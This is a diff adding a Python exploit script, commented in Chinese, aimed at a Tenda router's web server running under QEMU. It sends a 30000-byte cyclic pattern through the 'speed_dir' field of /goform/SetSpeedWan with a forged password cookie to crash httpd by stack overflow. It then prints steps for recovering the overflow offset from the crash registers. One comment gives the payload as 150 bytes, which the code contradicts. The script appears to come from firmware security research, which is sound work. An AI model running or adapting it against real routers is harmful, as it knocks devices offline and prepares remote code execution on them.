@@ -1,1 +1,57 @@
+import requests
+from pwn import *
+from requests.exceptions import ConnectionError, ReadTimeout
 
+# 目标环境配置
+IP = "192.168.252.136"
+PORT = 80
+# 腾达的路由通常将 formSetSpeedWan 映射为 /goform/SetSpeedWan
+URL = f"http://{IP}:{PORT}/goform/SetSpeedWan"
+
+# 1. 构造测试 Payload
+# ret_buf 只有 32 字节，加上前缀，溢出点非常浅。
+# 我们生成 150 字节的有序特征码，足够砸穿栈帧，又不会触发 Web 服务器的超长拦截
+PAYLOAD_LEN = 30000
+pattern = cyclic(PAYLOAD_LEN).decode('utf-8')
+
+print(f"[*] 目标接口: {URL}")
+print(f"[*] 生成测试 Payload (长度: {PAYLOAD_LEN} 字节)")
+print(f"[*] Payload 预览: {pattern[:30]}...")
+
+# 2. 构造 HTTP 请求
+# 伪造 Cookie (沿用你之前获取的凭证)
+cookies = {
+    "password": "recmji"
+}
+
+# 构造 POST 表单数据
+data = {
+    # 将致命的超长字符串注入到没有任何长度校验的 speed_dir 参数中
+    "speed_dir": pattern,
+    # 附带其他可能需要的参数，保持默认值即可
+    "ucloud_enable": "0",
+    "password": "0"
+}
+
+try:
+    print("[*] 正在发送致命请求...")
+    # 设置 timeout 为 3 秒。如果程序崩溃，连接会立刻断开或挂起超时
+    res = requests.post(URL, cookies=cookies, data=data, timeout=3)
+    
+    # 如果代码走到这里，说明服务器没有死，还正常返回了 HTTP 响应
+    print(f"[-] 警告: 服务器没有崩溃！返回状态码: {res.status_code}")
+    print(f"[-] 响应内容: {res.text}")
+
+except (ConnectionError, ReadTimeout) as e:
+    # 捕获到连接异常，这是栈溢出导致进程暴毙的标志
+    print("\n[+] 完美命中！连接异常中断，httpd 进程已崩溃。")
+    print("="*50)
+    print("👉 [下一步行动指北]")
+    print("1. 请立刻切换到运行 QEMU 的终端窗口。")
+    print("2. 寻找 'Segmentation fault' 的报错字眼。")
+    print("3. 找到崩溃瞬间的寄存器地址，特别是 EPC (Exception Program Counter) 或 RA (Return Address)。")
+    print("   它看起来像这样: EPC: 0x6161616a")
+    print("4. 拿到这个地址后，在你的宿主机终端运行: pwn cyclic -l 0x地址")
+    print("="*50)
+except Exception as e:
+    print(f"[-] 发生未知错误: {e}")
